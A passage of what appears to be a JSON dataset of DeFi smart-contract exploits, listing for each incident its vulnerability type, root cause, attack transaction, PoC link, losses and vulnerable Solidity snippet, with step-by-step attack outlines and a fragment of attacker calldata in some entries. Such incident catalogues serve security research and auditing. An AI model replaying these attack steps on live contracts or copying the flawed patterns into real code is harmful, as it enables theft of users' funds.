_data,\n        _operatorData\n    );\n\n    if (toPartition != _fromPartition) {\n        emit ChangedPartition(_fromPartition, toPartition, _value);\n    }\n\n    return toPartition;\n}"
    },
    {
        "type": "Vulnerability",
        "date": "20230827",
        "title": "Balancer",
        "root_cause": "The attack exploited a rounding down issue in the linear pools, letting the attacker manipulate the token exchange rate in the composable pool. By reducing BPT supply to zero and then performing a reverse swap, they achieved a nearly 1:1 exchange rate, which was lower than the linear pool's rate",
        "attack_tx": "https://etherscan.io/tx/0x2a027c8b915c3737942f512fc5d26fd15752d0332353b3059de771a35a606c2d",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-08/Balancer_exp.sol",
        "analysis": [
            "https://slowmist.medium.com/review-and-recommendations-of-balancer-incident-d2b31b5bd863",
            "https://medium.com/balancer-protocol/rate-manipulation-in-balancer-boosted-pools-technical-postmortem-53db4b642492",
            "https://blocksecteam.medium.com/yet-another-risk-posed-by-precision-loss-an-in-depth-analysis-of-the-recent-balancer-incident-fad93a3c75d4"
        ],
        "lost": "$2M",
        "vulnerable_code_snippet": "function onSwap(\n    SwapRequest memory request,\n    uint256[] memory balances,\n    uint256 indexIn,\n    uint256 indexOut\n) public view override onlyVault(request.poolId) whenNotPaused returns (uint256) {\n    // In most Pools, swaps involve exchanging one token held by the Pool for another. In this case however, since\n    // one of the three tokens is the BPT itself, a swap might also be a join (main/wrapped for BPT) or an exit\n    // (BPT for main/wrapped).\n    // All three swap types (swaps, joins and exits) are fully disabled if the emergency pause is enabled. Under\n    // these circumstances, the Pool should be exited using the regular Vault.exitPool function.\n\n    // Sanity check: this is not entirely necessary as the Vault's interface enforces the indices to be valid, but\n    // the check is cheap to perform.\n    _require(indexIn < _TOTAL_TOKENS && indexOut < _TOTAL_TOKENS, Errors.OUT_OF_BOUNDS);\n\n    // Note that we already know the indices of the main token, wrapped token and BPT, so there is no need to pass\n    // these indices to the inner functions.\n\n    // Upscale balances by the scaling factors (taking into account the wrapped token rate)\n    uint256[] memory scalingFactors = _scalingFactors();\n    _upscaleArray(balances, scalingFactors);\n\n    (uint256 lowerTarget, uint256 upperTarget) = getTargets();\n    LinearMath.Params memory params = LinearMath.Params({\n        fee: getSwapFeePercentage(),\n        lowerTarget: lowerTarget,\n        upperTarget: upperTarget\n    });\n\n    if (request.kind == IVault.SwapKind.GIVEN_IN) {\n        // The amount given is for token in, the amount calculated is for token out\n        request.amount = _upscale(request.amount, scalingFactors[indexIn]);\n        uint256 amountOut = _onSwapGivenIn(request, balances, params);\n\n        // amountOut tokens are exiting the Pool, so we round down.\n        return _downscaleDown(amountOut, scalingFactors[indexOut]);\n    } else {\n        // The amount given is for token out, the amount calculated is for token in\n        request.amount = _upscale(request.amount, scalingFactors[indexOut]);\n        uint256 amountIn = _onSwapGivenOut(request, balances, params);\n\n        // amountIn tokens are entering the Pool, so we round up.\n        return _downscaleUp(amountIn, scalingFactors[indexIn]);\n    }\n}"
    },
    {
        "type": "Under/Overflow",
        "date": "20240529",
        "title": "SCROLL",
        "root_cause": "Integer Underflow. Anyone can transfer tokens to owner address even though he has no tokens. I have simulated it. Strange! According to decompile, solidity version is 0.8.19. How is underflow possible?",
        "attack_tx": "https://app.blocksec.com/explorer/tx/eth/0x661505c39efe1174da44e0548158db95e8e71ce867d5b7190b9eabc9f314fe91",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-05/SCROLL_exp.sol",
        "analysis": "https://x.com/0xNickLFranklin/status/1795650745448169741",
        "lost": "76 ETH",
        "vulnerable_code_snippet": "// 2024.05.26 23:45 UTC\n// Compiled using the solidity compiler version 0.8.19\n\n// Data structures and variables inferred from the use of storage ins...\nmapping (uint256 => uint256) _totalSupply; // STORAGE[0x1]\nmapping (uint256 => mapping (uint256 => uint256)) _allowance; // STORAGE"
    },
    {
        "type": "Access Control, Dex/AMM",
        "date": "20210308",
        "title": "DODO",
        "root_cause": "Incorrect access control. The init() function in the pool creation contract could be called multiple times, leading to repeated initializations. The attackers took advantage of this and borrowed out the tokens in the liquidity pools using flash loans. The pool contract was then initialized again and counterfeit tokens created by the attackers were returned in lieu of the original tokens, bypassing the flash loan return check logic.",
        "attack_tx": null,
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20210308-dodo---flashloan-attack",
        "analysis": "The init() function in the pool creation contract could be called multiple times, leading to repeated initializations. The attackers took advantage of this and borrowed out the tokens in the liquidity pools using flash loans. The pool contract was then initialized again and counterfeit tokens created by the attackers were returned in lieu of the original tokens, bypassing the flash loan return check logic.",
        "vulnerable_code": "https://etherscan.io/address/0x051ebd717311350f1684f89335bed4abd083a2b6#code#L1419",
        "vulnerable_code_snippet": "function init(   \n        address maintainer,\n        address baseTokenAddress,\n        address quoteTokenAddress,\n        uint256 lpFeeRate,\n        address mtFeeRateModel,\n        uint256 i,\n        uint256 k,\n        bool isOpenTWAP\n    ) external { //vulnerable point\n        require(baseTokenAddress != quoteTokenAddress, \"BASE_QUOTE_CAN_NOT_BE_SAME\");\n        _BASE_TOKEN_ = IERC20(baseTokenAddress);\n        _QUOTE_TOKEN_ = IERC20(quoteTokenAddress);\n\n        require(i > 0 && i <= 10**36);\n        _I_ = i;\n\n        require(k <= 10**18);\n        _K_ = k;\n\n        _LP_FEE_RATE_ = lpFeeRate;\n        _MT_FEE_RATE_MODEL_ = IFeeRateModel(mtFeeRateModel);\n        _MAINTAINER_ = maintainer;\n\n        _IS_OPEN_TWAP_ = isOpenTWAP;\n        if(isOpenTWAP) _BLOCK_TIMESTAMP_LAST_ = uint32(block.timestamp % 2**32);\n\n        string memory connect = \"_\";\n        string memory suffix = \"DLP\";\n\n        name = string(abi.encodePacked(suffix, connect, addressToShortString(address(this))));\n        symbol = \"DLP\";\n        decimals = _BASE_TOKEN_.decimals();\n\n        // ============================== Permit ====================================\n        uint256 chainId;\n        assembly {\n            chainId := chainid()\n        }\n        DOMAIN_SEPARATOR = keccak256(\n            abi.encode(\n                // keccak256('EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)'),\n                0x8b73c3c69bb8fe3d512ecc4cf759cc79239f7b179b0ffacaa9a75d522b39400f,\n                keccak256(bytes(name)),\n                keccak256(bytes(\"1\")),\n                chainId,\n                address(this)\n            )\n        );\n        // ========================================================================== \n    }"
    },
    {
        "type": "Business Logic Flaw, Flashloans",
        "date": "20231117",
        "title": "Token8633_9419",
        "lost": "$52K",
        "root_cause": "The attacker first borrows tokens through a flash loan and deposits them through `autoAddLp()` 130 times. After several swap operations, the attacker triggers `autoSwapAndAddToMarketing()` 900 times, swaps the tokens back, and returns the flash loan.",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-11/Token8633_9419_exp.sol",
        "attack_tx": "https://explorer.phalcon.xyz/tx/bsc/0xf6ec3c22b718c3da17746416992bac7b65a4ef42ccf5b43cf0716c82bffc2844",
        "analysis": "None"
    },
    {
        "type": "Business Logic Flaw",
        "date": "20231217",
        "title": "FloorProtocol",
        "root_cause": "Attackers exploited the vulnerability by calling the multicall function in the Forwarder contract, altering the last 20 bytes of calldata to the attacker's address to execute the attack.",
        "attack_tx": "https://explorer.phalcon.xyz/tx/eth/0xec8f6d8e114caf8425736e0a3d5be2f93bbea6c01a50a7eeb3d61d2634927b40",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-12/FloorProtocol_exp.sol",
        "analysis": [
            "https://medium.com/@Jingkangchua/vulnerability-analysis-erc2771-multicall-545cad1f9028",
            "https://blog.verichains.io/p/address-spoofing-attack-the-combination"
        ],
        "Lost": "$1,6M",
        "vulnerable_code_snippet": "struct ForwardRequest {\n    address from;\n    address to;\n    uint256 value;\n    uint256 gas;\n    uint256 nonce;\n    bytes data;\n}\n\nfunction execute(ForwardRequest calldata req, bytes calldata signature) public payable returns (bool, bytes memory) {\n    // Here verify signature signer == req.from\n    (bool success, bytes memory result) = req.to.call{ gas: req.gas, value: req.value }(\n        abi.encodePacked(req.data, req.from) // append Sender here\n    );\n    // check gas and return\n    return (success, result);\n} ... bytes memory dataTransfer = abi.encodePacked(\n    abi.encodeWithSelector(\n        iTOKEN.transfer.selector,\n        attacker,\n        iTOKEN(token).balanceOf(victim) / 10 ** 18 * 10 ** 18\n    ),\n    victim\n);\n\nbytes;\narrBytes[0] = dataTransfer;\nbytes memory dataMulticall = abi.encodeWithSelector(iTOKEN.multicall.selector, arrBytes);"
    },
    {
        "type": "Flashloans, Misconfiguration, skim",
        "date": "20230217",
        "lost": "$12k",
        "title": "Starlink",
        "root_cause": "Misconfiguration in `transfer` function. StarlinkCoin contract used the `_transfer` function to transfer funds, which incurs a fee when funds come from the LP contract. The attacker used the `skim` method to directly transfer funds to the LP contract, and the fee was also deducted, causing a change in the proportion of the two tokens in the trading pair contract. The attacker then exchanged the tokens for a profit and left the contract.",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/Starlink_exp.sol",
        "attack_tx": "https://bscscan.com/tx/0x146586f05a4513136deab3557ad15df8f77ffbcdbd0dd0724bc66dbeab98a962",
        "analysis": [
            "https://twitter.com/NumenAlert/status/1626447469361102850",
            "https://twitter.com/bbbb/status/1626392605264351235"
        ],
        "vulnerable_code_snippet": "function _transfer(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) internal virtual override {\n        if (\n            botAddresses[sender] &&\n            amount > antiBotAmount &&\n            antiBotTime > block.timestamp\n        ) {\n            revert(\"Anti Bot\");\n        }\n\n        uint256 contractTokenBalance = balanceOf(address(this)); \n\n        if (contractTokenBalance >= _maxTxAmount) { \n            contractTokenBalance = _maxTxAmount; \n        }\n        \n        bool overMinTokenBalance = contractTokenBalance >= numTokensSellToAddToLiquidity;\n\n        bool buyLp = buyIndex >= buyIndexSellLiquify;\n\n        if (\n            overMinTokenBalance && \n            !inSwapAndLiquify && \n            sender != uniswapV2Pair && \n            swapAndLiquifyEnabled \n        ) {\n            contractTokenBalance = numTokensSellToAddToLiquidity;\n            swapAndLiquify(contractTokenBalance);\n        }\n\n        if (recipient == uniswapV2Pair) {\n            if (\n                sender != address(this) &&\n                recipient != address(this) &&\n                !_isExcludedFromFee[sender]\n            ) {\n                if (\n                    overMinTokenBalance && \n                    !inSwapAndLiquify && \n                    sender != uniswapV2Pair && \n                    swapSellLiquifyEnabled \n                ) {\n                    contractTokenBalance = numTokensSellToAddToLiquidity;\n                    swapAndLiquify(contractTokenBalance);\n                }\n                uint256 _fee = amount.mul(sellFeeRate).div(100);\n                super._transfer(sender, mintContract, _fee.mul(LPSellFees).div(sellFeeRate));\n                super._transfer(sender, addressForMarketing, _fee.mul(marketSellFees).div(sellFeeRate));\n                super._transfer(sender, BurnAddr, _fee.mul(burnSellFees).div(sellFeeRate));\n                amount = amount.sub(_fee);\n            }\n        } else if (sender == uniswapV2Pair) {\n            if (\n                sender != address(this) &&\n                recipient != address(this) &&\n                !_isExcludedFromFee[sender]\n            ) {\n                if (\n                    overMinTokenBalance && \n                    !inSwapAndLiquify && \n                    buyLp &&\n                    swapBuyLiquifyEnabled \n                ) {\n                    contractTokenBalance = numTokensSellToAddToLiquidity;\n                    swapAndLiquify(contractTokenBalance);\n                    buyIndex = 0;\n                }\n                uint256 _fee = amount.mul(buyFeeRate).div(100);\n                super._transfer(sender, mintContract, _fee.mul(LPBuyFees).div(buyFeeRate));\n                super._transfer(sender, addressForMarketing, _fee.mul(marketBuyFees).div(buyFeeRate));\n                super._transfer(sender, BurnAddr, _fee.mul(burnBuyFees).div(buyFeeRate));\n                amount = amount.sub(_fee);\n                buyIndex = buyIndex + 1;\n            }\n        }\n        \n        super._transfer(sender, recipient, amount);\n    }"
    },
    {
        "type": "Access Control, Price Manipulation",
        "date": "20230801",
        "title": "LeetSwap",
        "root_cause": "This exploit was a result of incorrect access control, where the _transferFeesSupportingTaxTokens() function  was incorrectly marked as public. This enabled the attacker to misuse the function to transfer tokens to LeetSwap's fee collection address, reducing axlUSD token liquidity and artificially inflating its price for their own gain.",
        "attack_tx": "https://basescan.org/tx/0xbb837d417b76dd237b4418e1695a50941a69259a1c4dee561ea57d982b9f10ec",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-08/Leetswap_exp.sol",
        "analysis": [
            "https://twitter.com/BlockSecTeam/status/1686217464051539968",
            "https://twitter.com/peckshield/status/1686209024587710464"
        ],
        "Lost": "$630K",
        "vulnerable_code_snippet": "function _transferFeesSupportingTaxTokens(address token, uint256 amount)\n        public\n        returns (uint256) {\n    if (amount == 0) {\n        return 0;\n    }\n\n    uint256 balanceBefore = IERC20(token).balanceOf(fees);\n    _safeTransfer(token, fees, amount);\n    uint256 balanceAfter = IERC20(token).balanceOf(fees);\n\n    return balanceAfter - balanceBefore;\n}"
    },
    {
        "type": "Incorrect logic",
        "date": "20240102",
        "lost": "500K",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-01/MIC_exp.sol",
        "title": "MIC",
        "root_cause": "There is a vulnerability that enables LP holders to claim LP fees repeatedly.",
        "attack_tx": "https://app.blocksec.com/explorer/tx/bsc/0x316c35d483b72700e6f4984650d217304146b3732bb148e32fa7f8017843eb24",
        "analysis": "https://x.com/MetaSec_xyz/status/1742484748239536173",
        "vulnerable_code_snippet": "function swapAndSendLPFee(address _addr) private {\n    if (blackListed[_addr] && blackListSwitch) {\n        return;\n    }\n    uint256 balance = IUniswapV2Pair(uniswapPair).balanceOf(_addr);\n    if (amountLPFee >= 1 * (10 ** 18) && balance > 0) { \n        uint256 total = IUniswapV2Pair(uniswapPair).totalSupply();\n        uint256 fee = amountLPFee.mul(balance).div(total);\n        if (fee >= 1 * (10 ** 13)) {\n            uint256 initialCAKEBalance = IERC20(usdt).balanceOf(address(this));\n            swapTokensForCake(fee);\n            uint256 newBalance = (IERC20(usdt).balanceOf(address(this))).sub(initialCAKEBalance);\n            IERC20(usdt).transfer(_addr, newBalance);\n            amountLPFee = amountLPFee.sub(fee);\n            emit swapAndSendLPFeeEvent(_addr, fee);\n        }\n    }\n}"
    },
    {
        "type": "Flashloans, skim",
        "date": "20230126",
        "title": "TomInu Token",
        "lost": "22 ETH",
        "root_cause": "Reflective token skim abuse. Tom Inu is a reflective token, aka each time a transfer happens holders will earn fees from it. 1. The Attacker Flashloan many WETH 2. Swap many WETH -> Tom Inu tokens, giving Uniswapv2 Pair large fees 3. Call skim on the Pair (gets fee). The skim function will balance the supply of pair and send the excess funds to the specified address. 4. Swap Tom Inu to WETH for profit",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/TINU_exp.t.sol",
        "attack_tx": "https://etherscan.io/tx/0x6200bf5c43c214caa1177c3676293442059b4f39eb5dbae6cfd4e6ad16305668",
        "analysis": "https://twitter.com/libevm/status/1618731761894309889",
        "vulnerable_code_snippet": "function deliver(uint256 tAmount) public {\n    address sender = _msgSender();\n    require(!_isExcluded[sender], \"Excluded addresses cannot call this function\");\n    (uint256 rAmount,,,,,) = _getValues(tAmount);\n    _rOwned[sender] = _rOwned[sender].sub(rAmount);\n    _rTotal = _rTotal.sub(rAmount);\n    _tFeeTotal = _tFeeTotal.add(tAmount);\n}"
    },
    {
        "type": "Flashloans",
        "date": "20230930",
        "Lost": "$3.2K MATIC",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-09/FireBirdPair_exp.sol",
        "Title": "FireBirdPair",
        "root_cause": "sink incorrect slippage protection",
        "Vulnerable code snippet": "https://polygonscan.com/address/0x5e9cd0861f927adeccfeb2c0124879b277dd66ac",
        "attack_tx": "https://polygonscan.com/tx/0x96d80c609f7a39b45f2bb581c6ba23402c20c2b6cd528317692c31b8d3948328",
        "analysis": ""
    },
    {
        "type": "Reentrancy",
        "date": "20230411",
        "lost": "$100k",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/Paribus_exp.sol",
        "title": "Paribus",
        "root_cause": "Reentrancy, doTransferOut() before updating variables",
        "attack_tx": "https://arbiscan.io/tx/0x0e29dcf4e9b211a811caf00fc8294024867bffe4ab2819cc1625d2e9d62390af",
        "analysis": [
            "https://twitter.com/Phalcon_xyz/status/1645742620897955842",
            "https://twitter.com/BlockSecTeam/status/1645744655357575170",
            "https://twitter.com/peckshield/status/1645742296904929280"
        ],
        "vulnerable_code_snippet": "function redeemInternal(uint redeemTokens) internal nonReentrant returns (uint) { // @audit: useless ReentrancyGuard since it was a cross-contract attack\n  accrueInterest();\n\n  return redeemFresh(msg.sender, redeemTokens, 0);\n}\n\nfunction redeemFresh(address payable redeemer, uint redeemTokensIn, uint redeemAmountIn) internal returns (uint) {  \n  ...\n\tvars.totalSupplyNew = sub_(totalSupply, vars.redeemTokens, 'REDEEM_TOO_MUCH');\n\tvars.accountTokensNew = sub_(accountTokens[redeemer], vars.redeemTokens, 'REDEEM_TOO_MUCH');\n\n\tdoTransferOut(redeemer, vars.redeemAmount); //vulnerable point\n\n  // @audit: vital variables are updated after interaction (doTransferOut)\ntotalSupply = vars.totalSupplyNew;\n\taccountTokens[redeemer] = vars.accountTokensNew;\n\n\tcomptroller.redeemVerify();\n}"
    },
    {
        "type": "Access Control, Flashloans",
        "date": "20230322",
        "lost": "$30k",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/BIGFI_exp.sol",
        "title": "BIGFI",
        "root_cause": "Public burn() without to proper access control",
        "vulnerable_code_snippet": "function burn(uint256 _value) public { // Vulnerable Point: Public Burn function Without proper Access Control\n        _burn(msg.sender, _value);\n    }",
        "attack_tx": "https://bscscan.com/tx/0x9fe19093a62a7037d04617b3ac4fbf5cb2d75d8cb6057e7e1b3c75cbbd5a5adc",
        "analysis": "https://twitter.com/HypernativeLabs/status/1638522680654675970"
    },
    {
        "type": "Signature",
        "date": "20240516",
        "title": "TCH",
        "root_cause": "Signature Malleability Vulnerability,  `0, 1` instead of `27, 28` (previous sigs) to achieve malleability. As a result the attacker burned lots of TCH tokens owned by the PancakeSwap pair, which allowed him to manipulate the price in the pool and take the profit.",
        "attack_tx": "https://app.blocksec.com/explorer/tx/bsc/0x316c35d483b72700e6f4984650d217304146b3732bb148e32fa7f8017843eb24",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-05/TCH_exp.sol",
        "analysis": [
            "https://x.com/DecurityHQ/status/1791180322882629713"
        ],
        "vulnerable_code": "https://bscscan.com/address/0x5d78cfc8732fd328015c9b73699de9556ef06e8e",
        "lost": "$18K",
        "vulnerable_code_snippet": "function burnToken(uint256 amount, uint256 nonce, bytes memory signature) external {\n    bytes32 signatureHash = keccak256(signature);\n    require(!usedSignatures[signatureHash], \"Signature has already been used\");\n    require(isAuthorizedSigner(amount, nonce, signature), \"Invalid or unauthorized signature\");\n    usedSignatures[signatureHash] = true;\n    uint256 deflationAmount = balances[uniswapV2Pair] * deflationFee / 10000;\n    balances[uniswapV2Pair] -= deflationAmount;\n    balances[address(0xdead)] += deflationAmount;\n    emit Transfer(uniswapV2Pair, address(0xdead), deflationAmount);\n    IUniswapV2Pair(uniswapV2Pair).sync();\n}\n\nfunction isAuthorizedSigner(uint256 amount, uint256 nonce, bytes memory signature) internal view returns (bool) {\n    bytes32 message = keccak256(abi.encodePacked(address(this), amount, nonce));\n    bytes32 ethSignedMessage = keccak256(abi.encodePacked(\"\\x19Ethereum Signed Message:\\n32\", message));\n    return recoverSigner(ethSignedMessage, signature) == authorizedSigner;\n}\n\nfunction recoverSigner(bytes32 ethSignedMessage, bytes memory signature) internal pure returns (address) {\n    (bytes32 r, bytes32 s, uint8 v) = splitSignature(signature);\n    return ecrecover(ethSignedMessage, v, r, s); // <-- vulnerable point if v either 27 or 28 will return 0\n}"
    },
    {
        "type": "Incorrect logic, Math",
        "date": "20230203",
        "title": "Spherax USDs",
        "root_cause": "Flawed internal accounting systems. USDS has three different accounting systems, two separate auto-migration systems, and all share the same variables, just interpret their meaning differently. Thus, all account variables have to be updated together in order to accurately calculate a user's balance. However, due to improper implementation, these critical updates were not performed accurately, leading to the attack.",
        "attack_tx": "https://arbiscan.io/tx/0xfaf84cabc3e1b0cf1ff1738dace1b2810f42d98baeea17b146ae032f0bdf82d5",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/USDs_exp.sol",
        "analysis": [
            "https://medium.com/sperax/usds-feb-3-exploit-report-from-engineering-team-9f0fd3cef00c",
            "https://twitter.com/danielvf/status/1621965412832350208"
        ],
        "Lost": "$309k",
        "vulnerable_code_snippet": "function isRebasing(address user) private {\n    isRebasing = Address.hasCode(user);\n    // Changing this affects balance calculations\n    if (isRebasing) {\n        if (_nonRebasingCreditsPerToken[user] == 0) {\n            // These should be updated together\n            _nonRebasingCreditsPerToken[user] = 1;\n            if (_balanceOf[user]) {\n                uint256 oldBalance = calculateBalance(user);\n                _nonRebasingSupply += oldBalance;\n                _balanceOf[user] = oldBalance;\n            }\n        }\n    }\n    return _nonRebasingCreditsPerToken[user];\n}"
    },
    {
        "type": "Flashloans",
        "date": "20240221",
        "title": "DeezNutz 404",
        "root_cause": "Self transfer in `_transfer()`",
        "attack_tx": "https://etherscan.io/tx/0xbeefd8faba2aa82704afe821fd41b670319203dd9090f7af8affdf6bcfec2d61",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-02/DeezNutz404_exp.sol",
        "analysis": "https://twitter.com/ImmuneBytes/status/1664239580210495489",
        "lost": "170k"
    },
    {
        "type": "Price Manipulation",
        "date": "20231206",
        "title": "ElephantStatus",
        "root_cause": "The unprotected sweep() function was exploited. Unprotected function here. Call to sweep will rise WBNB price Elephant.sweep();",
        "attack_tx": [
            "https://www.oklink.com/es-la/bsc/tx/0xd423ae0e95e9d6c8a89dcfed243573867e4aad29ee99a9055728cbbe0a523439",
            "https://explorer.phalcon.xyz/tx/bsc/0xd423ae0e95e9d6c8a89dcfed243573867e4aad29ee99a9055728cbbe0a523439",
            "https://app.blocksec.com/explorer/tx/bsc/0x7ccb189c78376bdc35294f1779e7156233bcbc65f8681b3d6a7f512c1c2d5218"
        ],
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-12/ElephantStatus_exp.sol",
        "analysis": [
            "// Unprotected function here. Call to sweep will rise WBNB price\nElephant.sweep(); ",
            "https://x.com/Phalcon_xyz/status/1732354930529435940"
        ],
        "Lost": "$165k"
    },
    {
        "type": "Reentrancy",
        "date": "20240219",
        "title": "RuggedArt",
        "root_cause": "In the function targetedPurchase(), an user could give an arbitrary swapParam which includes the field commands to 4. It then calls the UNIVERSAL_ROUTER.execute() function.  According to the Uniswap Technical Reference, commands 4 is SWEEP and it will call the sweep() function. As pointed from the following figure, the sweep() function will send back ETH to the user contract and cause a re-entrancy issue.",
        "attack_tx": "https://etherscan.io/tx/0x5a63da39b5b83fccdd825fed0226f330f802e995b8e49e19fbdd246876c67e1f",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-02/RuggedArt_exp.sol",
        "analysis": "https://twitter.com/AnciliaInc/status/1760718167582888148",
        "lost": "10k",
        "vulnerable_code_snippet": "function _executeSwap(UniversalRouterExecute calldata swapParam) private {\n    if (msg.value > 0) {\n        UNIVERSAL_ROUTER.execute{value: msg.value}(\n            swapParam.commands,\n            swapParam.inputs,\n            swapParam.deadline\n        );\n    } else {\n        revert InvalidParameter();\n    }\n}\n\n// If a user want to use ETH to buy Rug token, then it will use Uniswap to swap first,\n// user will use Uniwap UNIVERSAL_ROUTER to complete this step, _executeSwap function will be called\nfunction targetedPurchase(\n    uint256[] memory _tokenIds,\n    UniversalRouterExecute calldata swapParam\n) public payable {\n    uint256 beforeSwapBalance = ruggedToken.balanceOf(address(this));\n    _executeSwap(swapParam);\n    uint256 afterSwapBalance = ruggedToken.balanceOf(address(this));\n    uint256 totalAmount = afterSwapBalance - beforeSwapBalance;\n    if (totalAmount < _tokenIds.length * 1.1 ether) {\n        revert InvalidAmount();\n    }\n    _targetedPurchase(_tokenIds);\n} ... /// @notice Sweeps all of the contract's ERC20 or ETH to an address\n/// @param token The token to sweep (can be ETH using Constants.ETH)\n/// @param recipient The address that will receive payment\n/// @param amountMinimum The minimum desired amount\nfunction sweep(address token, address recipient, uint256 amountMinimum) internal {\n    uint256 balance;\n    if (token == Constants.ETH) {\n        balance = address(this).balance;\n        if (balance < amountMinimum) revert InsufficientETH();\n        if (balance > 0) recipient.safeTransferETH(balance);\n    } else {\n        balance = ERC20(token).balanceOf(address(this));\n        if (balance < amountMinimum) revert InsufficientToken();\n        if (balance > 0) ERC20(token).safeTransfer(recipient, balance);\n    }\n}"
    },
    {
        "type": "Flashloans, Payable, Reentrancy, lending",
        "date": "20220430",
        "Lost": "$80 M",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20220430-rari-capitalfei-protocol---flashloan-attack--reentrancy",
        "Title": "Rari Capital",
        "root_cause": "Not follow check-effect-interaction pattern. Do not follow check-effect-interaction pattern in function borrowFresh. `doTransferOut()` function transfers ETH to the receiver via a low-level call, attacker can make a reentrant call in the fallback() function to `exitMarket()`.",
        "vulnerable_code_snippet": "function borrowFresh(address payable borrower, uint borrowAmount) internal returns (uint) {\n    ...\n    /////////////////////////\n    // EFFECTS & INTERACTIONS\n    // (No safe failures beyond this point)\n\n    /*\n     * We invoke doTransferOut for the borrower and the borrowAmount.\n     * Note: The cToken must handle variations between ERC-20 and ETH underlying.\n     * On success, the cToken borrowAmount less of cash.\n     * doTransferOut reverts if anything goes wrong, since we can't be sure if side effects occurred.\n     */\n    doTransferOut(borrower, borrowAmount);  //vulnerable point\n\n    /* We write the previously calculated values into storage */\n    accountBorrows[borrower].principal = vars.accountBorrowsNew;\n    accountBorrows[borrower].interestIndex = borrowIndex;\n    totalBorrows = vars.totalBorrowsNew;\n\n    /* We emit a Borrow event */\n    emit Borrow(borrower, borrowAmount, vars.accountBorrowsNew, vars.totalBorrowsNew);\n}\n\nfunction doTransferOut(address payable to, uint amount) internal {\n    // Send the Ether and revert on failure\n    (bool success, ) = to.call.value(amount)();\n    require(success, \"doTransferOut failed\");\n}",
        "analysis": "Do not follow check-effect-interaction pattern in function borrowFresh.\ndoTransferOut() function transfers ETH to the receiver via a low-level call, attacker can make a reentrant call in the fallback() function to \u201cexitMarket()**.**",
        "attack_tx": null
    },
    {
        "type": "Price Manipulation, Reentrancy",
        "date": "20240127",
        "title": "CitadelFinance",
        "root_cause": "The vulnerability in the redeem() function of the Redemption smart contract allowed the attacker to manipulate the WETH/USDC.E pool price on Camelot. This caused the getAmountsOut() function to overestimate the value of deposited LP tokens, resulting in inflated redemption amounts.",
        "attack_tx": "https://phalcon.blocksec.com/explorer/tx/arbitrum/0xf52a681bc76df1e3a61d9266e3a66c7388ef579d62373feb4fd0991d36006855",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-01/CitadelFinance_exp.sol",
        "analysis": "https://medium.com/neptune-mutual/how-was-citadel-finance-exploited-a5f9acd0b408",
        "lost": "93K",
        "vulnerable_code_snippet": "function redeem(uint256 underlying, uint256 token, uint256 amount, uint8 rate) public nonReentrant {\n    require(underlying == 0 || underlying == 1, \"Invalid underlying\");\n    require(token == 0 || token == 1, \"Invalid token\");\n    require(rate == 0 || rate == 1, \"Invalid rate\");\n    require(amount > 0, \"Amount must be greater than 0\");\n\n    uint256 amountAvailable = CITStaking.redeemCalculator(msg.sender);\n\n        path;\n\n            path[0] = address(USDC); // 1e6\n            path[1] = address(WETH); // 1e18\n\n            uint[] memory a = camelotRouter.getAmountsOut(_amount / 1e12, path); // result in 18 decimal\n\n            amountInUnderlying = a[1];\n        } else {\n            amountInUnderlying = _amount / 1e12; // 1e6 is the decimals of USDC, so 18 - 12 = 6\n        }\n    }\n\n    if (token == 0) {\n        CIT.burn(CITStakingAddy, amount);\n        CITStaking.removeStaking(msg.sender, address(CIT), rate, amount);\n    } else if (token == 1) {\n        totalbCITRedeemedByUser[msg.sender] += amount;\n        bCIT.burn(CITStakingAddy, amount);\n        CITStaking.removeStaking(msg.sender, address(bCIT), rate, amount);\n    }\n\n    treasury.distributeRedeem(tokenAddy, amountInUnderlying, msg.sender);\n}"
    },
    {
        "type": "ERC20",
        "date": "20231117",
        "title": "ShibaToken",
        "lost": "$31K",
        "root_cause": "The `balanceOf` function of `Shiba` is not changed, so it will return all balances(including the `locked` amount). This is not a best practice. User could `transferLockToken` or `batchTransferLockToken` to the pair address. And the pair itself could not identify if the token is locked or not. As a result, the swap would still succeed. And the user could sell the `locked` token.",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-11/ShibaToken_exp.sol",
        "attack_tx": "https://explorer.phalcon.xyz/tx/bsc/0x75a26224da9faf37c2b3a4a634a096af7fec561f631a02c93e11e4a19d159477",
        "analysis": "https://app.blocksec.com/explorer/tx/bsc/0x75a26224da9faf37c2b3a4a634a096af7fec561f631a02c93e11e4a19d159477",
